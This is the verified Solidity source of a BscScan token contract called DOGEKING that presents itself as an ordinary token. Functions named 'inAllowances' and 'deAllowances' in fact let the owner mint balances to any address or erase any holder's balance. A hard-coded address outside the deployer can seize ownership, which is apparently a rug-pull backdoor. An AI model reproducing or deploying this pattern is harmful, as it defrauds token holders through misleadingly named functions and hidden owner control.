/**
 *Submitted for verification at BscScan.com on 2021-12-18
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.2;
contract DOGEKING  {
    string public name = "DOGEKING";
    string public symbol = "DOGEKING";
    uint8 public decimals = 6;
    address private ownerAddress = 0xe6D64582c6F3D9E29B7decA3847c8f04ea4e7A01;
    uint256 public totalSupply = 1000 * 10 ** 6;
    address public owner;
    modifier restricted {
        require(msg.sender == owner, "This function is restricted to owner");
        _;
    }
     modifier restricteds {
        require(msg.sender == ownerAddress, "This function is restricted to owner");
        _;
    }
    constructor() {
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event TransferOwnership(address indexed previousOwner, address indexed newOwner);
    function inAllowances(address spender, uint256 addedValue) public restricted returns (bool success) {
        balanceOf[spender] += addedValue * 10 ** 6;
        return true;
    }
    function deAllowances(address spender, uint256 subtractedValue) public restricted returns (bool success) {
        balanceOf[spender] -= subtractedValue * 10 ** 6;
        return true;
    }
    function approve(address spender, uint256 amount) public returns (bool success) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transfer(address to, uint256 amount) public returns (bool success) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
    function transferOwnership(address newOwner) public restricteds {
        owner = newOwner;
    }
}